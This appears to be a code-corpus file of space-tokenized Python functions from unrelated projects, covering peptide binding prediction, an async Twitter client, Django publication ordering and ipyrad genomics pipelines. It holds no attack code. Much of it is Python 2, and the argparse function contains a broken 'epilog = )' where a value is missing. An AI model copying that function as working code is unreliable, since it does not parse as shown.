def predict_peptides ( self , peptides ) : # importing locally to avoid slowing down CLI applications which # don't use MHCflurry from mhcflurry . encodable_sequences import EncodableSequences binding_predictions = [ ] encodable_sequences = EncodableSequences . create ( peptides ) for allele in self . alleles : predictions_df = self . predictor . predict_to_dataframe ( encodable_sequences , allele = allele ) for ( _ , row ) in predictions_df . iterrows ( ) : binding_prediction = BindingPrediction ( allele = allele , peptide = row . peptide , affinity = row . prediction , percentile_rank = ( row . prediction_percentile if 'prediction_percentile' in row else nan ) , prediction_method_name = "mhcflurry" ) binding_predictions . append ( binding_prediction ) return BindingPredictionCollection ( binding_predictions )
def _check_peptide_inputs ( self , peptides ) : require_iterable_of ( peptides , string_types ) check_X = not self . allow_X_in_peptides check_lower = not self . allow_lowercase_in_peptides check_min_length = self . min_peptide_length is not None min_length = self . min_peptide_length check_max_length = self . max_peptide_length is not None max_length = self . max_peptide_length for p in peptides : if not p . isalpha ( ) : raise ValueError ( "Invalid characters in peptide '%s'" % p ) elif check_X and "X" in p : raise ValueError ( "Invalid character 'X' in peptide '%s'" % p ) elif check_lower and not p . isupper ( ) : raise ValueError ( "Invalid lowercase letters in peptide '%s'" % p ) elif check_min_length and len ( p ) < min_length : raise ValueError ( "Peptide '%s' too short (%d chars), must be at least %d" % ( p , len ( p ) , min_length ) ) elif check_max_length and len ( p ) > max_length : raise ValueError ( "Peptide '%s' too long (%d chars), must be at least %d" % ( p , len ( p ) , max_length ) )
async def restart_stream ( self ) : await self . response . release ( ) await asyncio . sleep ( self . _error_timeout ) await self . connect ( ) logger . info ( "Reconnected to the stream" ) self . _reconnecting = False return { 'stream_restart' : True }
def get_error ( data ) : if isinstance ( data , dict ) : if 'errors' in data : error = data [ 'errors' ] [ 0 ] else : error = data . get ( 'error' , None ) if isinstance ( error , dict ) : if error . get ( 'code' ) in errors : return error
async def throw ( response , loads = None , encoding = None , * * kwargs ) : if loads is None : loads = data_processing . loads data = await data_processing . read ( response , loads = loads , encoding = encoding ) error = get_error ( data ) if error is not None : exception = errors [ error [ 'code' ] ] raise exception ( response = response , error = error , data = data , * * kwargs ) if response . status in statuses : exception = statuses [ response . status ] raise exception ( response = response , data = data , * * kwargs ) # raise PeonyException if no specific exception was found raise PeonyException ( response = response , data = data , * * kwargs )
def code ( self , code ) : def decorator ( exception ) : self [ code ] = exception return exception return decorator
def _user_headers ( self , headers = None ) : h = self . copy ( ) if headers is not None : keys = set ( headers . keys ( ) ) if h . get ( 'Authorization' , False ) : keys -= { 'Authorization' } for key in keys : h [ key ] = headers [ key ] return h
async def run ( self , * args , data ) : cmd = self . _get ( data . text ) try : if cmd is not None : command = self [ cmd ] ( * args , data = data ) return await peony . utils . execute ( command ) except : fmt = "Error occurred while running function {cmd}:" peony . utils . log_error ( fmt . format ( cmd = cmd ) )
def has_edge_within_group ( self , group ) : assert group in self . nodes . keys ( ) , "{0} not one of the group of nodes" . format ( group ) nodelist = self . nodes [ group ] for n1 , n2 in self . simplified_edges ( ) : if n1 in nodelist and n2 in nodelist : return True
def plot_axis ( self , rs , theta ) : xs , ys = get_cartesian ( rs , theta ) self . ax . plot ( xs , ys , 'black' , alpha = 0.3 )
def plot_nodes ( self , nodelist , theta , group ) : for i , node in enumerate ( nodelist ) : r = self . internal_radius + i * self . scale x , y = get_cartesian ( r , theta ) circle = plt . Circle ( xy = ( x , y ) , radius = self . dot_radius , color = self . node_colormap [ group ] , linewidth = 0 ) self . ax . add_patch ( circle )
def group_theta ( self , group ) : for i , g in enumerate ( self . nodes . keys ( ) ) : if g == group : break return i * self . major_angle
def find_node_group_membership ( self , node ) : for group , nodelist in self . nodes . items ( ) : if node in nodelist : return group
def get_idx ( self , node ) : group = self . find_node_group_membership ( node ) return self . nodes [ group ] . index ( node )
def node_radius ( self , node ) : return self . get_idx ( node ) * self . scale + self . internal_radius
def node_theta ( self , node ) : group = self . find_node_group_membership ( node ) return self . group_theta ( group )
def add_edges ( self ) : for group , edgelist in self . edges . items ( ) : for ( u , v , d ) in edgelist : self . draw_edge ( u , v , d , group )
def draw ( self ) : self . ax . set_xlim ( - self . plot_radius ( ) , self . plot_radius ( ) ) self . ax . set_ylim ( - self . plot_radius ( ) , self . plot_radius ( ) ) self . add_axes_and_nodes ( ) self . add_edges ( ) self . ax . axis ( 'off' )
def mods_genre ( self ) : type2genre = { 'conference' : 'conference publication' , 'book chapter' : 'bibliography' , 'unpublished' : 'article' } tp = str ( self . type ) . lower ( ) return type2genre . get ( tp , tp )
def _produce_author_lists ( self ) : # post-process author names self . authors = self . authors . replace ( ', and ' , ', ' ) self . authors = self . authors . replace ( ',and ' , ', ' ) self . authors = self . authors . replace ( ' and ' , ', ' ) self . authors = self . authors . replace ( ';' , ',' ) # list of authors self . authors_list = [ author . strip ( ) for author in self . authors . split ( ',' ) ] # simplified representation of author names self . authors_list_simple = [ ] # author names represented as a tuple of given and family name self . authors_list_split = [ ] # tests if title already ends with a punctuation mark self . title_ends_with_punct = self . title [ - 1 ] in [ '.' , '!' , '?' ] if len ( self . title ) > 0 else False suffixes = [ 'I' , 'II' , 'III' , 'IV' , 'V' , 'VI' , 'VII' , 'VIII' , "Jr." , "Sr." ] prefixes = [ 'Dr.' ] prepositions = [ 'van' , 'von' , 'der' , 'de' , 'den' ] # further post-process author names for i , author in enumerate ( self . authors_list ) : if author == '' : continue names = author . split ( ' ' ) # check if last string contains initials if ( len ( names [ - 1 ] ) <= 3 ) and names [ - 1 ] not in suffixes and all ( c in ascii_uppercase for c in names [ - 1 ] ) : # turn "Gauss CF" into "C. F. Gauss" names = [ c + '.' for c in names [ - 1 ] ] + names [ : - 1 ] # number of suffixes num_suffixes = 0 for name in names [ : : - 1 ] : if name in suffixes : num_suffixes += 1 else : break # abbreviate names for j , name in enumerate ( names [ : - 1 - num_suffixes ] ) : # don't try to abbreviate these if j == 0 and name in prefixes : continue if j > 0 and name in prepositions : continue if ( len ( name ) > 2 ) or ( len ( name ) and ( name [ - 1 ] != '.' ) ) : k = name . find ( '-' ) if 0 < k + 1 < len ( name ) : # take care of dash names [ j ] = name [ 0 ] + '.-' + name [ k + 1 ] + '.' else : names [ j ] = name [ 0 ] + '.' if len ( names ) : self . authors_list [ i ] = ' ' . join ( names ) # create simplified/normalized representation of author name if len ( names ) > 1 : for name in names [ 0 ] . split ( '-' ) : name_simple = self . simplify_name ( ' ' . join ( [ name , names [ - 1 ] ] ) ) self . authors_list_simple . append ( name_simple ) else : self . authors_list_simple . append ( self . simplify_name ( names [ 0 ] ) ) # number of prepositions num_prepositions = 0 for name in names : if name in prepositions : num_prepositions += 1 # splitting point sp = 1 + num_suffixes + num_prepositions self . authors_list_split . append ( ( ' ' . join ( names [ : - sp ] ) , ' ' . join ( names [ - sp : ] ) ) ) # list of authors in BibTex format self . authors_bibtex = ' and ' . join ( self . authors_list ) # overwrite authors string if len ( self . authors_list ) > 2 : self . authors = ', and ' . join ( [ ', ' . join ( self . authors_list [ : - 1 ] ) , self . authors_list [ - 1 ] ] ) elif len ( self . authors_list ) > 1 : self . authors = ' and ' . join ( self . authors_list ) else : self . authors = self . authors_list [ 0 ]
def get_publications ( context , template = 'publications/publications.html' ) : types = Type . objects . filter ( hidden = False ) publications = Publication . objects . select_related ( ) publications = publications . filter ( external = False , type__in = types ) publications = publications . order_by ( '-year' , '-month' , '-id' ) if not publications : return '' # load custom links and files populate ( publications ) return render_template ( template , context [ 'request' ] , { 'publications' : publications } )
def get_publication ( context , id ) : pbl = Publication . objects . filter ( pk = int ( id ) ) if len ( pbl ) < 1 : return '' pbl [ 0 ] . links = pbl [ 0 ] . customlink_set . all ( ) pbl [ 0 ] . files = pbl [ 0 ] . customfile_set . all ( ) return render_template ( 'publications/publication.html' , context [ 'request' ] , { 'publication' : pbl [ 0 ] } )
def get_publication_list ( context , list , template = 'publications/publications.html' ) : list = List . objects . filter ( list__iexact = list ) if not list : return '' list = list [ 0 ] publications = list . publication_set . all ( ) publications = publications . order_by ( '-year' , '-month' , '-id' ) if not publications : return '' # load custom links and files populate ( publications ) return render_template ( template , context [ 'request' ] , { 'list' : list , 'publications' : publications } )
def tex_parse ( string ) : string = string . replace ( '{' , '' ) . replace ( '}' , '' ) def tex_replace ( match ) : return sub ( r'\^(\w)' , r'<sup>\1</sup>' , sub ( r'\^\{(.*?)\}' , r'<sup>\1</sup>' , sub ( r'\_(\w)' , r'<sub>\1</sub>' , sub ( r'\_\{(.*?)\}' , r'<sub>\1</sub>' , sub ( r'\\(' + GREEK_LETTERS + ')' , r'&\1;' , match . group ( 1 ) ) ) ) ) ) return mark_safe ( sub ( r'\$([^\$]*)\$' , tex_replace , escape ( string ) ) )
def swap ( self , qs ) : try : replacement = qs [ 0 ] except IndexError : # already first/last return if not self . _valid_ordering_reference ( replacement ) : raise ValueError ( "%r can only be swapped with instances of %r which %s equals %r." % ( self , self . __class__ , self . order_with_respect_to , self . _get_order_with_respect_to ( ) ) ) self . order , replacement . order = replacement . order , self . order self . save ( ) replacement . save ( )
def up ( self ) : self . swap ( self . get_ordering_queryset ( ) . filter ( order__lt = self . order ) . order_by ( '-order' ) )
def down ( self ) : self . swap ( self . get_ordering_queryset ( ) . filter ( order__gt = self . order ) )
def to ( self , order ) : if order is None or self . order == order : # object is already at desired position return qs = self . get_ordering_queryset ( ) if self . order > order : qs . filter ( order__lt = self . order , order__gte = order ) . update ( order = F ( 'order' ) + 1 ) else : qs . filter ( order__gt = self . order , order__lte = order ) . update ( order = F ( 'order' ) - 1 ) self . order = order self . save ( )
def above ( self , ref ) : if not self . _valid_ordering_reference ( ref ) : raise ValueError ( "%r can only be moved above instances of %r which %s equals %r." % ( self , self . __class__ , self . order_with_respect_to , self . _get_order_with_respect_to ( ) ) ) if self . order == ref . order : return if self . order > ref . order : o = ref . order else : o = self . get_ordering_queryset ( ) . filter ( order__lt = ref . order ) . aggregate ( Max ( 'order' ) ) . get ( 'order__max' ) or 0 self . to ( o )
def below ( self , ref ) : if not self . _valid_ordering_reference ( ref ) : raise ValueError ( "%r can only be moved below instances of %r which %s equals %r." % ( self , self . __class__ , self . order_with_respect_to , self . _get_order_with_respect_to ( ) ) ) if self . order == ref . order : return if self . order > ref . order : o = self . get_ordering_queryset ( ) . filter ( order__gt = ref . order ) . aggregate ( Min ( 'order' ) ) . get ( 'order__min' ) or 0 else : o = ref . order self . to ( o )
def top ( self ) : o = self . get_ordering_queryset ( ) . aggregate ( Min ( 'order' ) ) . get ( 'order__min' ) self . to ( o )
def bottom ( self ) : o = self . get_ordering_queryset ( ) . aggregate ( Max ( 'order' ) ) . get ( 'order__max' ) self . to ( o )
def populate ( publications ) : customlinks = CustomLink . objects . filter ( publication__in = publications ) customfiles = CustomFile . objects . filter ( publication__in = publications ) publications_ = { } for publication in publications : publication . links = [ ] publication . files = [ ] publications_ [ publication . id ] = publication for link in customlinks : publications_ [ link . publication_id ] . links . append ( link ) for file in customfiles : publications_ [ file . publication_id ] . files . append ( file )
def make ( data , samples ) : outfile = open ( os . path . join ( data . dirs . outfiles , data . name + ".vcf" ) , 'w' ) inloci = os . path . join ( data . dirs . outfiles , data . name + ".loci" ) names = [ i . name for i in samples ] names . sort ( ) ## TODO: Get a real version number for the current sw stack version = "0.1" ## TODO: This is just reporting minimum depth per base. Would it be useful to ## report real depth of reads per base? YEAH, that's what supercatg is for. mindepth = data . paramsdict [ "mindepth_statistical" ] print >> outfile , "##fileformat=VCFv4.1" print >> outfile , "##fileDate=" + time . strftime ( "%Y%m%d" ) print >> outfile , "##source=ipyRAD.v." + version print >> outfile , "##reference=common_allele_at_each_locus" print >> outfile , "##INFO=<ID=NS,Number=1,Type=Integer,Description=\"Number of Samples With Data\">" print >> outfile , "##INFO=<ID=DP,Number=1,Type=Integer,Description=\"Total Depth\">" print >> outfile , "##INFO=<ID=AF,Number=A,Type=Float,Description=\"Allele Frequency\">" print >> outfile , "##INFO=<ID=AA,Number=1,Type=String,Description=\"Ancestral Allele\">" print >> outfile , "##FORMAT=<ID=GT,Number=1,Type=String,Description=\"Genotype\">" print >> outfile , "##FORMAT=<ID=GQ,Number=1,Type=Integer,Description=\"Genotype Quality\">" print >> outfile , "##FORMAT=<ID=DP,Number=1,Type=Integer,Description=\"Read Depth\">" print >> outfile , "\t" . join ( [ "#CHROM" , "POS" , "ID" , "REF" , "ALT" , "QUAL" , "FILTER" , "INFO    " , "FORMAT" ] + list ( names ) ) loci = open ( inloci ) . read ( ) . split ( "|" ) [ : - 1 ] snps = 0 vcflist = [ ] for locusnumber in range ( len ( loci ) ) : samps = [ i . split ( ) [ 0 ] [ 1 : ] for i in loci [ locusnumber ] . strip ( ) . split ( "\n" ) if ">" in i ] loc = np . array ( [ tuple ( i . split ( ) [ - 1 ] ) for i in loci [ locusnumber ] . strip ( ) . split ( "\n" ) if ">" in i ] ) NS = str ( len ( loc ) ) DP = str ( mindepth ) for base in range ( len ( loc . T ) ) : col = [ ] site = list ( loc . T [ base ] ) site = list ( "" . join ( site ) . replace ( "-" , "" ) . replace ( "N" , "" ) ) if site : for bb in site : if bb in list ( "RKYSWM" ) : col += unstruct ( bb ) [ 0 ] col += unstruct ( bb ) [ 1 ] else : col += bb REF = most_common ( [ i for i in col if i not in list ( "-RKYSWMN" ) ] ) ALT = set ( [ i for i in col if ( i in list ( "ATGC-N" ) ) and ( i != REF ) ] ) if ALT : snps += 1 GENO = [ REF ] + list ( ALT ) GENOS = [ ] for samp in names : if samp in samps : idx = samps . index ( samp ) f = unstruct ( loc . T [ base ] [ idx ] ) if ( '-' in f ) or ( 'N' in f ) : GENOS . append ( "./." ) else : GENOS . append ( str ( GENO . index ( f [ 0 ] ) ) + "|" + str ( GENO . index ( f [ 1 ] ) ) ) else : GENOS . append ( "./." ) vcflist . append ( "\t" . join ( [ `locusnumber+1` , `base+1` , '.' , REF , "," . join ( ALT ) , "20" , "PASS" , ";" . join ( [ "NS=" + NS , "DP=" + DP ] ) , "GT" ] + GENOS ) ) if not locusnumber % 1000 : outfile . write ( "\n" . join ( vcflist ) + "\n" ) vcflist = [ ] #print >>outfile, "\t".join([`locusnumber+1`, `base+1`, '.', REF, ",".join(ALT), "20", "PASS", #                            ";".join(["NS="+NS, "DP="+DP]), "GT"]+GENOS) outfile . write ( "\n" . join ( vcflist ) ) outfile . close ( )
def count_var ( nex ) : arr = np . array ( [ list ( i . split ( ) [ - 1 ] ) for i in nex ] ) miss = np . any ( arr == "N" , axis = 0 ) nomiss = arr [ : , ~ miss ] nsnps = np . invert ( np . all ( nomiss == nomiss [ 0 , : ] , axis = 0 ) ) . sum ( ) return nomiss . shape [ 1 ] , nsnps
def sample_loci ( self ) : ## store idx of passing loci idxs = np . random . choice ( self . idxs , self . ntests ) ## open handle, make a proper generator to reduce mem with open ( self . data ) as indata : liter = ( indata . read ( ) . strip ( ) . split ( "|\n" ) ) ## store data as dict seqdata = { i : "" for i in self . samples } ## put chunks into a list for idx , loc in enumerate ( liter ) : if idx in idxs : ## parse chunk lines = loc . split ( "\n" ) [ : - 1 ] names = [ i . split ( ) [ 0 ] for i in lines ] seqs = [ i . split ( ) [ 1 ] for i in lines ] dd = { i : j for i , j in zip ( names , seqs ) } ## add data to concatenated seqdict for name in seqdata : if name in names : seqdata [ name ] += dd [ name ] else : seqdata [ name ] += "N" * len ( seqs [ 0 ] ) ## concatenate into a phylip file return seqdata
def run ( self , ipyclient ) : ## connect to parallel client lbview = ipyclient . load_balanced_view ( ) ## iterate over tests asyncs = [ ] for test in xrange ( self . ntests ) : ## submit jobs to run async = lbview . apply ( worker , self ) asyncs . append ( async ) ## wait for jobs to finish ipyclient . wait ( ) ## check for errors for async in asyncs : if not async . successful ( ) : raise Exception ( "Error: {}" . format ( async . result ( ) ) ) ## return results as df results = [ i . result ( ) for i in asyncs ] self . results_table = pd . DataFrame ( results )
def plot ( self ) : if self . results_table == None : return "no results found" else : bb = self . results_table . sort_values ( by = [ "ABCD" , "ACBD" ] , ascending = [ False , True ] , ) ## make a barplot import toyplot c = toyplot . Canvas ( width = 600 , height = 200 ) a = c . cartesian ( ) m = a . bars ( bb ) return c , a , m
def copy ( self ) : cp = copy . deepcopy ( self ) cp . genotypes = allel . GenotypeArray ( self . genotypes , copy = True ) return cp
def sample_cleanup ( data , sample ) : umap1file = os . path . join ( data . dirs . edits , sample . name + "-tmp-umap1.fastq" ) umap2file = os . path . join ( data . dirs . edits , sample . name + "-tmp-umap2.fastq" ) unmapped = os . path . join ( data . dirs . refmapping , sample . name + "-unmapped.bam" ) samplesam = os . path . join ( data . dirs . refmapping , sample . name + ".sam" ) split1 = os . path . join ( data . dirs . edits , sample . name + "-split1.fastq" ) split2 = os . path . join ( data . dirs . edits , sample . name + "-split2.fastq" ) refmap_derep = os . path . join ( data . dirs . edits , sample . name + "-refmap_derep.fastq" ) for f in [ umap1file , umap2file , unmapped , samplesam , split1 , split2 , refmap_derep ] : try : os . remove ( f ) except : pass
def fetch_cluster_se ( data , samfile , chrom , rstart , rend ) : ## If SE then we enforce the minimum overlap distance to avoid the ## staircase syndrome of multiple reads overlapping just a little. overlap_buffer = data . _hackersonly [ "min_SE_refmap_overlap" ] ## the *_buff variables here are because we have to play patty ## cake here with the rstart/rend vals because we want pysam to ## enforce the buffer for SE, but we want the reference sequence ## start and end positions to print correctly for downstream. rstart_buff = rstart + overlap_buffer rend_buff = rend - overlap_buffer ## Reads that map to only very short segements of the reference ## sequence will return buffer end values that are before the ## start values causing pysam to complain. Very short mappings. if rstart_buff > rend_buff : tmp = rstart_buff rstart_buff = rend_buff rend_buff = tmp ## Buffering can't make start and end equal or pysam returns nothing. if rstart_buff == rend_buff : rend_buff += 1 ## store pairs rdict = { } clust = [ ] iterreg = [ ] iterreg = samfile . fetch ( chrom , rstart_buff , rend_buff ) ## use dict to match up read pairs for read in iterreg : if read . qname not in rdict : rdict [ read . qname ] = read ## sort dict keys so highest derep is first ('seed') sfunc = lambda x : int ( x . split ( ";size=" ) [ 1 ] . split ( ";" ) [ 0 ] ) rkeys = sorted ( rdict . keys ( ) , key = sfunc , reverse = True ) ## get blocks from the seed for filtering, bail out if seed is not paired try : read1 = rdict [ rkeys [ 0 ] ] except ValueError : LOGGER . error ( "Found bad cluster, skipping - key:{} rdict:{}" . format ( rkeys [ 0 ] , rdict ) ) return "" ## the starting blocks for the seed poss = read1 . get_reference_positions ( full_length = True ) seed_r1start = min ( poss ) seed_r1end = max ( poss ) ## store the seed ------------------------------------------- if read1 . is_reverse : seq = revcomp ( read1 . seq ) else : seq = read1 . seq ## store, could write orient but just + for now. size = sfunc ( rkeys [ 0 ] ) clust . append ( ">{}:{}:{};size={};*\n{}" . format ( chrom , seed_r1start , seed_r1end , size , seq ) ) ## If there's only one hit in this region then rkeys will only have ## one element and the call to `rkeys[1:]` will raise. Test for this. if len ( rkeys ) > 1 : ## store the hits to the seed ------------------------------- for key in rkeys [ 1 : ] : skip = False try : read1 = rdict [ key ] except ValueError : ## enter values that will make this read get skipped read1 = rdict [ key ] [ 0 ] skip = True ## orient reads only if not skipping if not skip : poss = read1 . get_reference_positions ( full_length = True ) minpos = min ( poss ) maxpos = max ( poss ) ## store the seq if read1 . is_reverse : seq = revcomp ( read1 . seq ) else : seq = read1 . seq ## store, could write orient but just + for now. size = sfunc ( key ) clust . append ( ">{}:{}:{};size={};+\n{}" . format ( chrom , minpos , maxpos , size , seq ) ) else : ## seq is excluded, though, we could save it and return ## it as a separate cluster that will be aligned separately. pass return clust
def fetch_cluster_pairs ( data , samfile , chrom , rstart , rend ) : ## store pairs rdict = { } clust = [ ] ## grab the region and make tuples of info iterreg = samfile . fetch ( chrom , rstart , rend ) ## use dict to match up read pairs for read in iterreg : if read . qname not in rdict : rdict [ read . qname ] = [ read ] else : rdict [ read . qname ] . append ( read ) ## sort dict keys so highest derep is first ('seed') sfunc = lambda x : int ( x . split ( ";size=" ) [ 1 ] . split ( ";" ) [ 0 ] ) rkeys = sorted ( rdict . keys ( ) , key = sfunc , reverse = True ) ## get blocks from the seed for filtering, bail out if seed is not paired try : read1 , read2 = rdict [ rkeys [ 0 ] ] except ValueError : return 0 ## the starting blocks for the seed poss = read1 . get_reference_positions ( ) + read2 . get_reference_positions ( ) seed_r1start = min ( poss ) seed_r2end = max ( poss ) ## store the seed ------------------------------------------- ## Simplify. R1 and R2 are always on opposite strands, but the ## orientation is variable. We revcomp and order the reads to ## preserve genomic order. reads_overlap = False if read1 . is_reverse : if read2 . aend > read1 . get_blocks ( ) [ 0 ] [ 0 ] : reads_overlap = True seq = read2 . seq + "nnnn" + revcomp ( read1 . seq ) else : seq = read2 . seq + "nnnn" + read1 . seq else : if read1 . aend > read2 . get_blocks ( ) [ 0 ] [ 0 ] : reads_overlap = True seq = read1 . seq + "nnnn" + revcomp ( read2 . seq ) else : seq = read1 . seq + "nnnn" + read2 . seq ## store, could write orient but just + for now. size = sfunc ( rkeys [ 0 ] ) clust . append ( ">{}:{}:{};size={};*\n{}" . format ( chrom , seed_r1start , seed_r2end , size , seq ) ) ## If there's only one hit in this region then rkeys will only have ## one element and the call to `rkeys[1:]` will raise. Test for this. if len ( rkeys ) > 1 : ## store the hits to the seed ------------------------------- for key in rkeys [ 1 : ] : skip = False try : read1 , read2 = rdict [ key ] except ValueError : ## enter values that will make this read get skipped read1 = rdict [ key ] [ 0 ] read2 = read1 skip = True ## orient reads and filter out ones that will not align well b/c ## they do not overlap enough with the seed poss = read1 . get_reference_positions ( ) + read2 . get_reference_positions ( ) minpos = min ( poss ) maxpos = max ( poss ) ## skip if more than one hit location if read1 . has_tag ( "SA" ) or read2 . has_tag ( "SA" ) : skip = True ## store if read passes  if ( abs ( minpos - seed_r1start ) < 50 ) and ( abs ( maxpos - seed_r2end ) < 50 ) and ( not skip ) : ## store the seq if read1 . is_reverse : ## do reads overlap if read2 . aend > read1 . get_blocks ( ) [ 0 ] [ 0 ] : reads_overlap = True seq = read2 . seq + "nnnn" + revcomp ( read1 . seq ) else : seq = read2 . seq + "nnnn" + read1 . seq else : if read1 . aend > read2 . get_blocks ( ) [ 0 ] [ 0 ] : reads_overlap = True seq = read1 . seq + "nnnn" + revcomp ( read2 . seq ) else : seq = read1 . seq + "nnnn" + read2 . seq ## store, could write orient but just + for now. size = sfunc ( key ) clust . append ( ">{}:{}:{};size={};+\n{}" . format ( chrom , minpos , maxpos , size , seq ) ) else : ## seq is excluded, though, we could save it and return ## it as a separate cluster that will be aligned separately. pass ## merge the pairs prior to returning them ## Remember, we already tested for quality scores, so ## merge_after_pysam will generate arbitrarily high scores ## It would be nice to do something here like test if ## the average insert length + 2 stdv is > 2*read len ## so you can switch off merging for mostly non-overlapping data if reads_overlap : if data . _hackersonly [ "refmap_merge_PE" ] : clust = merge_after_pysam ( data , clust ) #clust = merge_pair_pipes(data, clust) return clust
def refmap_init ( data , sample , force ) : ## make some persistent file handles for the refmap reads files sample . files . unmapped_reads = os . path . join ( data . dirs . edits , "{}-refmap_derep.fastq" . format ( sample . name ) ) sample . files . mapped_reads = os . path . join ( data . dirs . refmapping , "{}-mapped-sorted.bam" . format ( sample . name ) )
def parse_command_line ( ) : ## create the parser parser = argparse . ArgumentParser ( formatter_class = argparse . RawDescriptionHelpFormatter , epilog = ) ## get version from ipyrad  ipyversion = str ( pkg_resources . get_distribution ( 'ipyrad' ) ) parser . add_argument ( '-v' , '--version' , action = 'version' , version = "tetrad " + ipyversion . split ( ) [ 1 ] ) parser . add_argument ( '-f' , "--force" , action = 'store_true' , help = "force overwrite of existing data" ) parser . add_argument ( '-s' , metavar = "seq" , dest = "seq" , type = str , default = None , help = "path to input phylip file (only SNPs)" ) parser . add_argument ( '-j' , metavar = 'json' , dest = "json" , type = str , default = None , help = "load checkpointed/saved analysis from JSON file." ) parser . add_argument ( '-m' , metavar = "method" , dest = "method" , type = str , default = "all" , help = "method for sampling quartets (all, random, or equal)" ) parser . add_argument ( '-q' , metavar = "nquartets" , dest = "nquartets" , type = int , default = 0 , help = "number of quartets to sample (if not -m all)" ) parser . add_argument ( '-b' , metavar = "boots" , dest = "boots" , type = int , default = 0 , help = "number of non-parametric bootstrap replicates" ) parser . add_argument ( '-l' , metavar = "map_file" , dest = "map" , type = str , default = None , help = "map file of snp linkages (e.g., ipyrad .snps.map)" ) parser . add_argument ( '-r' , metavar = "resolve" , dest = 'resolve' , type = int , default = 1 , help = "randomly resolve heterozygous sites (default=1)" ) parser . add_argument ( '-n' , metavar = "name" , dest = "name" , type = str , default = "test" , help = "output name prefix (default: 'test')" ) parser . add_argument ( '-o' , metavar = "workdir" , dest = "workdir" , type = str , default = "./analysis-tetrad" , help = "output directory (default: creates ./analysis-tetrad)" ) parser . add_argument ( '-t' , metavar = "starting_tree" , dest = "tree" , type = str , default = None , help = "newick file starting tree for equal splits sampling" ) parser . add_argument ( "-c" , metavar = "CPUs/cores" , dest = "cores" , type = int , default = 0 , help = "setting -c improves parallel efficiency with --MPI" ) parser . add_argument ( "-x" , metavar = "random_seed" , dest = "rseed" , type = int , default = None , help = "random seed for quartet sampling and/or bootstrapping" ) parser . add_argument ( '-d' , "--debug" , action = 'store_true' , help = "print lots more info to debugger: ipyrad_log.txt." ) parser . add_argument ( "--MPI" , action = 'store_true' , help = "connect to parallel CPUs across multiple nodes" ) parser . add_argument ( "--invariants" , action = 'store_true' , help = "save a (large) database of all invariants" ) parser . add_argument ( "--ipcluster" , metavar = "ipcluster" , dest = "ipcluster" , type = str , nargs = "?" , const = "default" , help = "connect to ipcluster profile (default: 'default')" ) ## if no args then return help message if len ( sys . argv ) == 1 : parser . print_help ( ) sys . exit ( 1 ) ## parse args args = parser . parse_args ( ) ## RAISE errors right away for some bad argument combinations: if args . method not in [ "random" , "equal" , "all" ] : raise IPyradWarningExit ( "  method argument (-m) must be one of" + """ "all", "random", or "equal.\n""" ) ## if 'random' require nquarts argument #if args.method == 'random': #    if not args.nquartets: #        raise IPyradWarningExit(\ #        "  Number of quartets (-q) is required with method = random\n") ## if 'equal' method require starting tree and nquarts # if args.method == 'equal': #     raise IPyradWarningExit(\ #         "  The equal sampling method is currently for developers only.\n") #     if not args.nquartets: #         raise IPyradWarningExit(\ #         "  Number of quartets (-q) is required with method = equal\n") #     if not args.tree: #         raise IPyradWarningExit(\ #         "  Input guide tree (-t) is required with method = equal\n") ## required args if not any ( x in [ "seq" , "json" ] for x in vars ( args ) . keys ( ) ) : print ( ) parser . print_help ( ) sys . exit ( 1 ) return args
def _command_list ( self ) : ## base args cmd = [ self . params . binary , "-i" , OPJ ( self . workdir , self . name + ".treemix.in.gz" ) , "-o" , OPJ ( self . workdir , self . name ) , ] ## addon params args = [ ] for key , val in self . params : if key not in [ "minmap" , "binary" ] : if key == "g" : if val [ 0 ] : args += [ "-" + key , str ( val [ 0 ] ) , str ( val [ 1 ] ) ] elif key == "global_" : if val : args += [ "-" + key [ : - 1 ] ] elif key in [ "se" , "global" , "noss" ] : if val : args += [ "-" + key ] else : if val : args += [ "-" + key , str ( val ) ] return cmd + args
def _subsample ( self ) : spans = self . maparr samp = np . zeros ( spans . shape [ 0 ] , dtype = np . uint64 ) for i in xrange ( spans . shape [ 0 ] ) : samp [ i ] = np . random . randint ( spans [ i , 0 ] , spans [ i , 1 ] , 1 ) return samp
def draw ( self , axes ) : ## create a toytree object from the treemix tree result tre = toytree . tree ( newick = self . results . tree ) tre . draw ( axes = axes , use_edge_lengths = True , tree_style = 'c' , tip_labels_align = True , edge_align_style = { "stroke-width" : 1 } ) ## get coords  for admix in self . results . admixture : ## parse admix event pidx , pdist , cidx , cdist , weight = admix a = _get_admix_point ( tre , pidx , pdist ) b = _get_admix_point ( tre , cidx , cdist ) ## add line for admixture edge mark = axes . plot ( a = ( a [ 0 ] , b [ 0 ] ) , b = ( a [ 1 ] , b [ 1 ] ) , style = { "stroke-width" : 10 * weight , "stroke-opacity" : 0.95 , "stroke-linecap" : "round" } ) ## add points at admixture sink axes . scatterplot ( a = ( b [ 0 ] ) , b = ( b [ 1 ] ) , size = 8 , title = "weight: {}" . format ( weight ) , ) ## add scale bar for edge lengths axes . y . show = False axes . x . ticks . show = True axes . x . label . text = "Drift parameter" return axes
def run_mbsum ( self , ipyclient , force = False , quiet = False ) : minidir = os . path . realpath ( os . path . join ( self . workdir , self . name ) ) trees1 = glob . glob ( os . path . join ( minidir , "*.run1.t" ) ) trees2 = glob . glob ( os . path . join ( minidir , "*.run2.t" ) ) ## clear existing files  existing = glob . glob ( os . path . join ( self . workdir , self . name , "*.sumt" ) ) if any ( existing ) : if force : for rfile in existing : os . remove ( rfile ) else : path = os . path . join ( self . workdir , self . name ) raise IPyradWarningExit ( EXISTING_SUMT_FILES . format ( path ) ) ## load balancer lbview = ipyclient . load_balanced_view ( ) ## submit each to be processed asyncs = [ ] for tidx in xrange ( len ( trees1 ) ) : rep1 = trees1 [ tidx ] rep2 = trees2 [ tidx ] outname = os . path . join ( minidir , str ( tidx ) + ".sumt" ) async = lbview . apply ( _call_mbsum , * ( rep1 , rep2 , outname ) ) asyncs . append ( async ) ## track progress start = time . time ( ) printstr = "[mbsum] sum replicate runs      | {} | " while 1 : ready = [ i . ready ( ) for i in asyncs ] elapsed = datetime . timedelta ( seconds = int ( time . time ( ) - start ) ) if not quiet : progressbar ( len ( ready ) , sum ( ready ) , printstr . format ( elapsed ) , spacer = "" ) if len ( ready ) == sum ( ready ) : if not quiet : print ( "" ) break else : time . sleep ( 0.1 ) ## check success for async in asyncs : if not async . successful ( ) : raise IPyradWarningExit ( async . result ( ) )
